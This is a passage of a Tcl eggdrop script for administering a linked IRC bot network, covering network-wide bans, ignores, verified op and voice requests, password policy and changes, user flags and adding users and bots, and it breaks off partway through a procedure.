   set creator [sindex $args 0] ; set ban [fixhost [sindex $args 1] [lindex [channels] 0]]
   if {![scan_banlist $ban]} { return }
   if {[sindex $args 2] == ""} {
      set lifetime 0
   } else { set lifetime [sindex $args 2] }
   if {[srange $args 3 end] == ""} {
      set comment "Requested"
   } else { set comment [srange $args 3 end] }
   if {![matchattr $creator b]} { putlog "\[\002BAN\002\] Banning '$ban' - (requested by $creator@$bot)" }
   newban $ban $creator $comment $lifetime
}
bind bot - ban global_ban

proc channel_ban { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   if {[sindex $args 0] == "" || [sindex $args 1] == "" || [sindex $args 2] == ""} { return }
   set creator [sindex $args 0] ; set channel [sindex $args 2] ; set ban [fixhost [sindex $args 1] $channel]
   if {![scan_banlist $ban]} { return }
   if {[sindex $args 3] == ""} {
      set lifetime 0
   } else { set lifetime [sindex $args 3] }
   if {[srange $args 4 end] == ""} {
      set comment "Requested"
   } else { set comment [srange $args 4 end] }
   if {![matchattr $creator b]} { putlog "\[\002CHANBAN\002\] Banning '$ban' on $channel - (requested by $creator@$bot)" }
   newchanban $channel $ban $creator $comment $lifetime
}
bind bot - chanban channel_ban

proc global_unban { handle idx args } {
   global nick
   if {![matchattr $handle o] && ![matchattr $handle g]} { putdcc $idx "What?  You need '.help'" ; return }
   set bans [lindex $args 0]
   putcmdlog "#$handle# -ban $bans"
   if {$bans == ""} { putdcc $idx "\002Usage:\002 .-ban <hosts|indices>" ; return }
   foreach 1ban [split $bans] {
      if {![string match *!*@* $1ban] && ($1ban < 1 || $1ban > [llength [banlist]])} { continue }
      if {$1ban > 0 && $1ban <= [llength [banlist]]} { set 1ban [lindex [lindex [banlist] [expr $1ban-1]] 0] }
      if {[isban $1ban]} { killban $1ban }
      foreach 1chan [channels] {
         if {![isban $1ban $1chan] && ![ischanban $1ban $1chan]} { continue }
         if {![killchanban $1chan $1ban] && [botisop $1chan]} { pushmode $1chan -b $1ban }
      }
      if {[bots] != ""} { putbot [lindex [bots] [rand [llength [bots]]]] "unban $1ban $handle" }
      setutimer 10 "putallbots \"unban [str2tcl $1ban] [str2tcl $handle]\""
   }
}
unbind dcc - -ban *dcc:-ban
bind dcc - -ban global_unban

proc net_unban { bot commands args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set ban [sindex $args 0] ; set handle [sindex $args 1]
   if {[isban $ban]} { killban $ban }
   foreach 1chan [channels] {
      if {[isban $ban $1chan] || [ischanban $ban $1chan]} { killchanban $1chan $ban }
      if {[ischanban $ban $1chan] && [botisop $1chan]} { pushmode $1chan -b $ban }
   }
   putlog "\[\002UNBAN\002\] Removed '$ban' from banlist"
   putlog " - Authorized by $handle@$bot"
}
bind bot - unban net_unban

proc global_ignore { handle idx args } {
   global nick
   set args [lindex $args 0]
   set host [sindex $args 0] ; set comment [srange $args 1 end]
   putcmdlog "#$handle# +ignore $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$host == ""} { putdcc $idx "\002Usage:\002 .+ignore <hostmask> \[comment\]" ; return }
   if {![string match *!*@* $host]} { putdcc $idx "Invalid ignore - hostmask must be of the form:  nick!ident@host" ; return }
   if {![isignore $host]} { newignore $host $handle $comment 0 }
   putallbots "net_ignore $handle $host $comment"
   putdcc $idx "*** Now ignoring '$host' on all bots ..."
}
unbind dcc - +ignore *dcc:+ignore
bind dcc n +ignore global_ignore
bind dcc n localignore *dcc:+ignore

proc net_ignore { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set host [sindex $args 1] ; set comment [srange $args 2 end]
   if {![isignore $host]} { newignore $host $handle $comment 0 }
   putlog "\[\002IGNORE\002\] Now ignoring $host"
   putlog " - Authorized by $handle@$bot"
}
bind bot - net_ignore net_ignore

proc global_unignore { handle idx args } {
   global nick
   set ignores [lindex $args 0]
   putcmdlog "#$handle# -ignore $ignores"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$ignores == ""} { putdcc $idx "\002Usage:\002 .-ignore <hosts|indices>" ; return }
   foreach 1ignore [split $ignores] {
      if {![string match *!*@* $1ignore] && ($1ignore < 1 || $1ignore > [llength [ignorelist]])} { continue }
      if {$1ignore > 0 && $1ignore <= [llength [ignorelist]]} { set 1ignore [lindex [lindex [ignorelist] [expr $1ignore-1]] 0] }
      if {[isignore $1ignore]} { killignore $1ignore }
      putallbots "unignore $1ignore $handle"
   }
}
unbind dcc - -ignore *dcc:-ignore
bind dcc n -ignore global_unignore
bind dcc n localunignore *dcc:-ignore

proc net_unignore { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set ignore [sindex $args 0] ; set handle [sindex $args 1]
   if {[isignore $ignore]} { killignore $ignore }
   putlog "\[\002UNIGNORE\002\] Removed '$ignore' from ignore list"
   putlog " - Authorized by $handle@$bot"
}
bind bot - unignore net_unignore

proc change_console { idx arg } {
   set handle [idx2hand $idx]
   if {![matchattr $handle g]} { return $arg }
   set channel [sindex $arg 1]
   if {[string index $channel 0] != "#"} { putdcc $idx "\002Usage:\002 .console <channel>" ; return }
   putcmdlog "#$handle# [string range $arg 1 end]"
   if {![validchan $channel]} { putdcc $idx "Invalid channel" ; return }
   console $idx $channel
   putdcc $idx "Set your console to $channel"
   return
}
bind filt - ".console*" change_console

proc op_me { handle idx args } {
   global gopqueue
   set channels [lindex $args 0]
   putcmdlog "#$handle# opme"
   if {![validop $handle]} { putdcc $idx "*** This command is only for global ops.  Please use '.op' instead." ; return }
   set host [string tolower [idx2host $idx]]
   if {$host == ""} { putdcc $idx "Invalid partyline host (?)" ; return }
   foreach 1host [string tolower [gethosts $handle]] {
      if {[string match [str2tcl *!*[lindex [split $1host !] 1]] *!*$host]} { set found "" ; break }
   }
   if {![info exists found]} { putdcc $idx "*** Your partyline host does not match any of your user hosts." ; return }
   putallbots "verifygop $handle $idx $host"
   lappend gopqueue($idx) 1
   setutimer 3 "gopuser $idx"
   putdcc $idx "*** Verifying your global-op status, please wait ..."
}
bind dcc o opme op_me

proc verify_gop { bot command args } {
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set idx [sindex $args 1]
   set host [string tolower [sindex $args 2]]
   if {![validuser $handle] || (![matchattr $handle b] && ![matchattr $handle p]) ||
       ![matchattr $handle o] || [matchattr $handle d]} {
      catch {putbot $bot "notgop $idx"}
      return
   }
   foreach 1host [string tolower [gethosts $handle]] {
      if {[string match [str2tcl *!*[lindex [split $1host !] 1]] *!*$host]} { return }
   }
   catch {putbot $bot "notgop $idx"}
}
bind bot - verifygop verify_gop

proc notgop { bot command args } {
   global gopqueue
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set idx [sindex $args 0]
   if {![info exists gopqueue($idx)]} { return }
   kill_utimer "gopuser $idx"
   announce "\[\002WARNING\002\] \002[idx2hand $idx]\002 attempted to globally op himself, but he is not a global op on all bots."
   announce " - Verified by:  $bot"
   putdcc $idx " - Global-op verification:  Failed."
   catch {unset gopqueue($idx)}
}
bind bot - notgop notgop

proc gopuser { idx } {
   global gopqueue
   putdcc $idx " - Global-op verification:  Passed."
   catch {unset gopqueue($idx)}
   if {![matchattr [idx2hand $idx] o]} { return }
   set nick ""
   set host [string tolower [idx2host $idx]]
   if {$host == ""} { return }
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      foreach 1nick [chanlist $1chan op] {
         if {[isop $1nick $1chan] || [string tolower [getchanhost $1nick $1chan]] != $host} { continue }
         if {$nick == ""} {
            set nick $1nick
         } elseif {$nick != $1nick} {
            if {[valididx $idx]} { putdcc $idx "*** Unable to globally op you:  multiple nicks match your partyline host ($nick, $1nick)" }
            return
         }
      }
   }
   if {$nick == ""} {
      if {![valididx $idx]} { return }
      putdcc $idx "\[\002ERROR\002\] No action taken.  Possible reasons:"
      putdcc $idx "  1. You are not on IRC with the same host as on the partyline."
      putdcc $idx "     Check your nickname if your host is nick dependent."
      putdcc $idx "  2. You are already opped on all my channels."
      putdcc $idx "  3. This bot is not opped."
      putdcc $idx " "
   } else {
      foreach 1chan [channels] { secureOp $nick $1chan }
   }
}

proc check_opstatus { idx args } {
   global opqueue
   set args [lindex $args 0] ; set uhandle [idx2hand $idx]
   if {![strcmp [sindex $args 0] .op]} { return $args }
   if {[info exists opqueue($idx)]} { putdcc $idx "Please wait while I process your previous request." ; return }
   set nick [sindex $args 1] ; set channel [sindex $args 2]
   putcmdlog "#[idx2hand $idx]# op $nick $channel"
   if {$nick == ""} { putdcc $idx "Usage: op <nick> \[channel\]" ; return }
   if {$channel != "" && ![validchan $channel]} { putdcc $idx "No such channel." ; return }
   if {$channel == ""} {
      if {[catch {set channel [sindex [console $idx] 0]}] != 0} { putdcc $idx "Invalid console channel." ; return }
      if {![validchan $channel]} { putdcc $idx "Invalid console channel: $channel" ; return }
      if {$channel == ""} { putdcc $idx "No console channel set." ; return }
   }
   if {![validop $uhandle $channel]} { putdcc $idx "You are not a registered op on $channel." ; return }
   set handle [nick2hand $nick $channel]
   if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a chan op on $channel." ; return }
   if {![onchan $nick $channel]} { putdcc $idx "$nick is not on $channel." ; return }
   if {![validop $handle $channel]} { putdcc $idx "$nick is not a registered op on $channel." ; return }
   if {$handle != $uhandle} { putdcc $idx "You may only op yourself through the bots." ; return }
   putdcc $idx "*** Verifying op status of \002$nick\002, please wait ..."
   putallbots "verifyop $nick $channel $idx"
   lappend opqueue($idx) $nick $channel
   setutimer 3 "opuser $idx"
   return
}
bind filt - ".op*" check_opstatus

proc verify_op { bot command args } {
   global botnick
   set args [lindex $args 0]
   set nick [sindex $args 0] ; set channel [sindex $args 1] ; set idx [sindex $args 2]
   if {![validchan $channel] || ![onchan $botnick $channel] || [getchanhost $nick $channel] == {}} { return }
   set handle [nick2hand $nick $channel]
   if {![validop $handle $channel] || (![matchattr $handle b] && ![matchattr $handle p])} {
      catch {putbot $bot "notop $idx $nick $channel"} ; return
   }
}
bind bot - verifyop verify_op

proc notop { bot command args } {
   global opqueue
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set idx [sindex $args 0] ; set nick [sindex $args 1] ; set channel [sindex $args 2]
   if {![info exists opqueue($idx)]} { return }
   kill_utimer "opuser $idx"
   announce "\[\002WARNING\002\] \002[idx2hand $idx]\002 attempted to op '$nick' on $channel, but he is not a registered op on all bots."
   announce " - Verified by:  $bot"
   putdcc $idx " - Op verification:  Failed."
   catch {unset opqueue($idx)}
}
bind bot - notop notop

proc opuser { idx } {
   global opqueue
   set nick [lindex $opqueue($idx) 0]
   set channel [lindex $opqueue($idx) 1]
   putdcc $idx " - Op verification:  Passed."
   secureOp $nick $channel
   catch {unset opqueue($idx)}
}

proc voice_users { handle idx args } {
   set args [lindex $args 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# voice $args"
      if {$args == ""} { putdcc $idx "\002Usage:\002 .voice \[nick\] \[channel\]" ; return }
   }
   if {[string index [sindex $args 0] 0] == "#"} {
      set channel [string tolower [sindex $args 0]]
      if {![valididx $idx] && [isclosed $channel] || [isautokick $channel]} { return }
      if {[valididx $idx]} {
         if {![validchan $channel]} { putdcc $idx "Invalid channel: $channel" ; return }
         if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a chan op on $channel." ; return }
      }
      foreach 1user [chanlist $channel] {
         set hand [nick2hand $1user $channel]
         if {![matchattr $hand v] && ![matchchanattr $hand 0 $channel]} { continue }
         if {![isop $1user $channel] && ![isvoice $1user $channel]} { lappend vnicks $1user }
      }
      if {![info exists vnicks]} {
         if {[valididx $idx]} { putdcc $idx "All +v users on $channel are already opped or voiced." }
         return
      }
      mass_mode + v putserv $channel $vnicks
      if {[valididx $idx]} {
         putdcc $idx "Gave voice status to \002[llength $vnicks]\002 user(s) on $channel."
      } else { putlog "\[\002AUTOVOICE\002\] Auto-voiced \002[llength $vnicks]\002 user(s) on $channel." }
      return
   }
   set nick [sindex $args 0]
   set channel [string tolower [sindex $args 1]]
   if {$channel == ""} { 
      if {[catch {set channel [sindex [console $idx] 0]}] != 0} {
         putdcc $idx "Invalid console channel." ; return 
      }
      if {![validchan $channel]} { putdcc $idx "Invalid console channel: $channel" ; return }
      if {$channel == ""} { putdcc $idx "No console channel set." ; return }
   }
   if {![validchan $channel]} { putdcc $idx "Invalid channel: $channel" ; return }
   if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a chan op on $channel." ; return }
   if {![onchan $nick $channel]} { putdcc $idx "$nick is not on $channel." ; return }
   if {[isop $nick $channel] || [isvoice $nick $channel]} { putdcc $idx "$nick is already voiced or opped." ; return }
   putserv "MODE $channel +v $nick"
   putdcc $idx "Gave voice status to \002$nick\002 on $channel."
}
bind dcc o voice voice_users
bind dcc o +voice voice_users

proc devoice_users { handle idx args } {
   set args [lindex $args 0]
   if {[string index [sindex $args 0] 0] == "#" || [string index [sindex $args 0] 0] == "&"} {
      set channel [sindex $args 0]
      if {![validchan $channel]} { putdcc $idx "Invalid channel: $channel" ; return }
      if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a chan op on $channel." ; return }
      mass_devoice $handle $idx $channel
      return
   }
   putcmdlog "#$handle# devoice $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .devoice \[nick\] \[channel\]" ; return }
   set nick [sindex $args 0] ; set channel [sindex $args 1]
   if {$nick == ""} { putdcc $idx "\002Usage:\002 .devoice <nick> \[channel\]" ; return }
   if {$channel == ""} { 
      if {[catch {set channel [sindex [console $idx] 0]}] != 0} {
         putdcc $idx "Invalid console channel." ; return
      }
      if {![validchan $channel]} { putdcc $idx "Invalid console channel: $channel" ; return }
      if {$channel == ""} { putdcc $idx "No console channel set." ; return }
   }
   if {![validchan $channel]} { putdcc $idx "Invalid channel: $channel" ; return }
   if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a chan op on $channel." ; return }
   if {![onchan $nick $channel]} { putdcc $idx "$nick is not on $channel." ; return }
   if {[isop $nick $channel] || ![isvoice $nick $channel]} { putdcc $idx "$nick is not voiced on $channel." ; return }
   putserv "MODE $channel -v $nick"
   putdcc $idx "Removed voice status from \002$nick\002 on $channel."
}
bind dcc o devoice devoice_users
bind dcc o -voice devoice_users

proc change_pass { handle idx args } {
   global nick
   set args [lindex $args 0]
   set user [sindex $args 0] ; set pass [sindex $args 1]
   if {[strcmp $user $handle]} {
      putcmdlog "#$handle# newpass ..."
      if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
      if {$pass == ""} { putdcc $idx "\002Usage:\002 .newpass <password>" ; return }
   } else {
      if {![matchattr $nick boT]} { noflag $idx ; return }
      putcmdlog "#$handle# chpass $user \[something\]"
      if {$pass == ""} { putdcc $idx "\002Usage:\002 .chpass <user> <password>" ; return }
   }
   if {![validuser $user]} { putdcc $idx "Invalid user" ; return }
   if {([matchattr $handle m] && ![matchattr $handle n]) && [matchattr $user n]} {
      putdcc $idx "You cannot change a bot owner's password." ; return
   }
   if {[string length $pass] < 8} { putdcc $idx "All passwords must consist of at least 8 characters." ; return }
   if {![string match *\[a-z\]* $pass]} {
      putdcc $idx "There must be at least one lowercase letter in the password." ; return
   }
   if {![string match *\[A-Z\]* $pass]} {
      putdcc $idx "There must be at least one capital letter in the password." ; return
   }
   if {![string match *\[[str2tcl !@#$%^&\*()\?{}_/><,\;'"=+-\.|`~:]\]* $pass]} {
      putdcc $idx "There must be at least one special character in the password." ; return
   }
   if {![string match *\[0-9\]* $pass]} {
      putdcc $idx "At least one character in the password must be a number." ; return
   }
   set string ""
   foreach 1char [split $handle ""] { append string \*$1char }
   append string \*
   if {[string length $handle] > 3 && [string match [string tolower [str2tcl $string]] [string tolower $pass]]} {
      putdcc $idx "You must not base the password on your handle." ; return
   }
   set string ""
   foreach 1char [split $user ""] { append string \*$1char }
   append string \*
   if {[string length $user] > 3 && [string match [string tolower [str2tcl $string]] [string tolower $pass]]} {
      putdcc $idx "You must not base the password on the user's handle." ; return
   }
   if {[validuser $pass]} { putdcc $idx "You must not base the password on another user's handle." ; return }
   putdcc $idx "*** Changing password for \002$user\002 on all bots ..."
   chpass $user $pass
   putallbots "changepass $handle $user $pass"
   save
}
bind dcc m chpass change_pass

proc net_changepass { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set user [sindex $args 1] ; set pass [sindex $args 2]
   if {![strcmp $handle $user] && ![matchattr $bot boT]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to change $user's password from a non +T bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {[strcmp $handle $user] && ![matchattr $bot boT] && ![matchattr $bot boS]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to change his password from a non +T/+S bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {![validuser $handle] || ![validuser $user] ||
            (([matchattr $handle m] && ![matchattr $handle n]) && [matchattr $user n]) || 
            (([matchattr $handle o] && ![matchattr $handle m] && ![matchattr $handle n]) && ![strcmp $user $handle])} {
      return
   } else {
      chpass $user $pass
      putlog "\[\002CHPASS\002\] Changed password for \002$user\002."
      putlog " - Authorized by $handle@$bot"
      save
   }
}
bind bot - changepass net_changepass

proc new_pass { handle idx args } {
   global nick
   if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
   change_pass $handle $idx "$handle $args"
}
bind dcc o newpass new_pass

proc set_pass { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# setpass $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .setpass <*|bots>" ; return }
   if {$args == "*"} {
      set bots [bots]
      putdcc $idx "*** Setting passwords for all currently linked bots ..."
   } else {
      putdcc $idx "*** Setting passwords for the following bot(s):  $args"
      set bots [split $args]
   }
   foreach 1chbot $bots {
      if {![matchattr $1chbot b]} { continue }
      set newpass [randstring 15]
      if {[catch {putbot $1chbot "setpass $nick $newpass $handle"}] == 0} {
         chpass $1chbot $newpass
         foreach 1bot [bots] {
            if {[matchattr $nick H]} { chattr $1bot +s }
            set newpass [randstring 15]
            if {[catch {putbot $1chbot "setpass $1bot $newpass $handle"}] == 0} {
               catch {putbot $1bot "setpass $1chbot $newpass $handle"}
            }
         }
      }
   }
   setutimer 2 save
   net_setpasswords $nick - -
   putallbots "setpasswords"
}
bind dcc n setpass set_pass
bind dcc n setbotpass set_pass

proc net_setpass { bot command args } {
   global nick
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set thebot [sindex $args 0] ; set pass [sindex $args 1] ; set handle [sindex $args 2]
   if {![matchattr $thebot b]} { return }
   if {[matchattr $nick H]} { chattr $thebot +s }
   chpass $thebot $pass
   putlog "\[\002SETPASS\002\] New password set for \002$thebot\002 by $handle@$bot"
   setutimer 2 save
}
bind bot - setpass net_setpass

proc set_passwords { handle idx args } {
   global nick
   putcmdlog "#$handle# setpasswords"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   net_setpasswords $nick - -
   putallbots "setpasswords"
   putdcc $idx "*** Removing blank passwords from all bots ..."
}
bind dcc n setpasswords set_passwords

proc net_setpasswords { bot command args } {
   if {![matchattr $bot boT]} { return }
   foreach 1user [userlist] {
      if {[passwdok $1user ""]} {
         chpass $1user [randstring 15]
         set found ""
      }
   }
   if {[info exists found]} { setutimer 1 save }
}
bind bot - setpasswords net_setpasswords

proc setnewpasses {} {
   foreach 1bot [bots] {
      set pass [randstring 15]
      if {[catch {putbot $1bot "newbotpass $pass"}] == 0} { chpass $1bot $pass }
   }
   setutimer 1 save
}

proc net_newpass { bot command args } {
   if {![matchattr $bot boT]} { return }
   set handle [sindex [lindex $args 0] 0]
   putlog "\[\002NEWPASS\002\] Setting a new password on all bots"
   putlog " - Authorized by $handle@$bot"
   setnewpasses
}
bind bot boT netnewpass net_newpass

proc new_botpass { bot command args } {
   if {![matchattr $bot bo]} { return }
   set pass [lindex $args 0]
   if {$pass == ""} { return }
   chpass $bot $pass
   putlog "\[\002NEWPASS\002\] \002$bot\002 has set a new password."
   setutimer 2 save
}
bind bot bo newbotpass new_botpass

proc set_comment { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# comment $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .comment <*|user> \[comment\]" ; return }
   set user [sindex $args 0]
   set comment [srange $args 1 end]
   if {$user == "*" && $comment == ""} {
      putdcc $idx "*** Removing comment line from all users on all bots ..."
      foreach 1user [userlist] {
         if {[getcomment $1user] != ""} { setcomment $1user "" }
         putallbots "setcomment $1user $handle $comment"
      }
      save
   } elseif {![validuser $user]} {
      putdcc $idx "\[\002ERROR\002\] Unable to set comment line, invalid user"
   } elseif {$comment == ""} {
      putdcc $idx "*** Removing comment line from \002$user\002 on all bots ..."
      setcomment $user ""
      putallbots "setcomment $user $handle $comment"
      save
   } else {
      putdcc $idx "*** Setting comment line for \002$user\002 on all bots ..."
      setcomment $user $comment
      putallbots "setcomment $user $handle $comment"
      save
   }
}
unbind dcc - comment *dcc:comment
bind dcc n comment set_comment
bind dcc n setcomment set_comment

proc net_setcomment { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set user [sindex $args 0] ; set handle [sindex $args 1] ; set comment [srange $args 2 end]
   if {![validuser $user]} { return }
   if {$comment != ""} {
      if {[getcomment $user] == $comment} { return }
      setcomment $user $comment
      putlog "\[\002COMMENT\002\] Set comment line for \002$user\002 to '$comment'."
   } else {
      if {[getcomment $user] == ""} { return }
      setcomment $user ""
      putlog "\[\002COMMENT\002\] Removed comment line from \002$user\002."
   }
   putlog " - Authorized by $handle@$bot"
   setutimer 1 save
}
bind bot - setcomment net_setcomment

proc chattr_status { user } {
   global chattr
   if {![info exists chattr($user)] || $chattr($user) == {}} { return }
   putlog "\[\002CAUTION\002\] 60 seconds have passed, and still awaiting botnet-chattr completion."
   putlog " - The following bot(s) have yet to confirm flag changes:  [lsort $chattr($user)]"
   putlog " - Manual flag change on the specified bot(s) is advised."
}

proc net_chattr { handle idx args } {
   global nick chattr auth-passwd
   set args [lindex $args 0]
   set params [lindex [split $args :] 0]
   set user [sindex $params 0] ; set flags [sindex $params 1] ; set channel [sindex $params 2]
   putcmdlog "#$handle# chattr $user $flags $channel"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .chattr <user> \[\[+/-\]flags\] \[channel\] \[:auth-passwd\]" ; return }
   if {![validuser $user]} { putdcc $idx "*** Unable to chattr \002$user\002, invalid user." ; return }
   if {[regexp "(n|W|T|A)+" $flags] && ![isauth $idx] && ![keycheck $idx [lindex [split $args :] 1] ${auth-passwd} "CHATTR"]} { return }
   set info {}
   lappend info [lindex [getxtra $user] [lsearch [getxtra $user] "created *"]]
   if {$flags == ""} {
      putdcc $idx "*** Removing all flags from \002$user\002 on all bots"
      chattr $user -[allflags]
      foreach 1chan [channels] { delchanrec $user $1chan }
      lappend info "Flags removed by $handle - [ctime [unixtime]]"
   } elseif {$channel != ""} {
      if {[validchan $channel]} {
         putdcc $idx "*** Setting channel-specific flags for \002$user\002 on $channel to '$flags' on all bots"
         chattr $user $flags $channel
         if {[chattr $user $channel] == "-"} { delchanrec $user $channel }
      }
      lappend info "Flags for $channel ($flags) set by $handle - [ctime [unixtime]]"
   } else {
      putdcc $idx "*** Setting global flags for \002$user\002 to '$flags' on all bots"
      chattr $user $flags
      lappend info "Flags ($flags) set by $handle - [ctime [unixtime]]"
   }
   setxtra $user $info
   if {[bots] != ""} {
      set chattr($user) [bots]
      setutimer 60 "chattr_status [str2tcl $user]"
      putdcc $idx "*** Please wait for botnet confirmation ..."
   }
   putallbots "netchattr $handle $user $flags $channel"
   save
}
bind dcc n netchattr net_chattr
bind dcc n chattr net_chattr

proc botnet_chattr { bot command args } {
   global nick
   if {![matchattr $bot boT] || [getting-users]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set user [sindex $args 1] ; set flags [sindex $args 2] ; set channel [sindex $args 3]
   if {![validuser $user]} { return }
   set info {}
   lappend info [lindex [getxtra $user] [lsearch [getxtra $user] "created *"]]
   if {$flags == ""} {
      chattr $user -[allflags]
      foreach 1chan [channels] { delchanrec $user $1chan }
      lappend info "Flags removed by $handle - [ctime [unixtime]]"
      putlog "\[\002FLAGS\002\] Removed all flags from \002$user\002."
   } elseif {$channel != ""} {
      if {[validchan $channel]} {
         chattr $user $flags $channel
         if {[chattr $user $channel] == "-"} { delchanrec $user $channel }
      }
      lappend info "Flags for $channel ($flags) set by $handle - [ctime [unixtime]]"
      putlog "\[\002FLAGS\002\] Set channel-specific flags for \002$user\002 on $channel to '$flags'."
   } else {
      chattr $user $flags
      lappend info "Flags ($flags) set by $handle - [ctime [unixtime]]"
      putlog "\[\002FLAGS\002\] Set global flags for \002$user\002 to '$flags'."
   }
   setxtra $user $info
   catch {putbot $bot "chattrdone $user"}
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - netchattr botnet_chattr

proc chattr_done { bot command args } {
   global chattr
   set user [lindex $args 0]
   if {![info exists chattr($user)]} { return }
   if {[set s [lsearch -exact $chattr($user) $bot]] != -1} { set chattr($user) [lreplace $chattr($user) $s $s] }
   if {[llength $chattr($user)] == 0} {
      putlog "*** Botnet-chattr of \002$user\002 successfully completed."
      kill_utimer "chattr_status [str2tcl $user]"
      catch {unset chattr($user)}
   }
}
bind bot - chattrdone chattr_done

proc change_address { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# chaddr $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set bot [sindex $args 0] ; set address [sindex $args 1]
   if {$address == ""} { putdcc $idx "\002Usage:\002 .chaddr <bot> <address:botport/userport>" ; return }
   if {![validuser $bot] || ![matchattr $bot b]} { putdcc $idx "Invalid bot ($bot)" ; return }
   setinfo $bot $address
   putallbots "netchaddr $handle $bot $address"
   putdcc $idx "*** Linking address successfully changed."
   save
}
unbind dcc - chaddr *dcc:chaddr
bind dcc n chaddr change_address

proc net_chaddr { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set chbot [sindex $args 1] ; set address [sindex $args 2]
   if {![validuser $chbot] || ![matchattr $chbot b]} { return }
   setinfo $chbot $address
   putlog "\[\002CHADDR\002\] Linking address for \002$chbot\002 changed to $address."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - netchaddr net_chaddr

proc add_user { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# +user $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .+user <user> <host1> \[host2\] ..." ; return }
   set user [sindex $args 0] ; set hosts [srange $args 1 end]
   putdcc $idx "*** Adding \002$user\002 to user database on all bots ..."
   if {![validuser $user]} { adduser $user [sindex $hosts 0] }
   foreach 1host [split $hosts] {
      if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] == -1} { addhost $user $1host }
   }
   putallbots "adduser $handle $user $hosts"
   save
}
bind dcc n adduser add_user
bind dcc n +user add_user

proc net_adduser { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set user [sindex $args 1] ; set hosts [srange $args 2 end]
   if {![validuser $user]} { adduser $user [sindex $hosts 0] }
   foreach 1host [split $hosts] {
      if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] == -1} { addhost $user $1host }
   }
   putlog "\[\002ADDUSER\002\] Added \002$user\002 to user database."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - adduser net_adduser

proc add_bot { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# +bot $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .+bot <bot> <address>" ; return }
   set bot [sindex $args 0] ; set address [sindex $args 1]
   putdcc $idx "*** Adding \002$bot\002 to user database on all bots ..."
   if {![validuser $bot]} { addbot $bot $address }
   putallbots "addbot $handle $bot $address"
   save
}
bind dcc n addbot add_bot
bind dcc n +bot add_bot

proc net_addbot { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set newbot [sindex $args 1] ; set address [sindex $args 2]
   if {![validuser $newbot]} { addbot $newbot $address }
   putlog "\[\002ADDBOT\002\] Added \002$newbot\002 to user database."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - addbot net_addbot

proc new_bot { handle idx args } {
   global nick group counters dontOp
   set args [lindex $args 0]
   set hand [sindex $args 0] ; set username [sindex $args 1] ; set hostname [sindex $args 2] ; set IP [sindex $args 3]
   set botport [sindex $args 4] ; set userport [sindex $args 5] ; set pass [sindex $args 6]
   putcmdlog "#$handle# newbot $hand $username $hostname $IP $botport $userport [srange $args 7 end]"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {[srange $args 6 end] == ""} { putdcc $idx "\002Usage:\002 .newbot <botnick> <username> <hostname> <IP> <botport> <userport> <pass> \[limbo?\] \[leaf/hub\] \[address\]" ; return }
   if {[validuser $hand]} {
      if {[matchattr $hand b]} { deluser $hand } else { putdcc $idx "*** That handle already exists in user database as a non-bot." ; return }
   }
   set flags "" ; set hub ""
   if {$botport < 1024 || $botport > 65535} { putdcc $idx "Invalid bot port  (valid range: 1024-65535)" ; return }
   if {$userport < 1024 || $userport > 65535} { putdcc $idx "Invalid user port  (valid range: 1024-65535)" ; return }
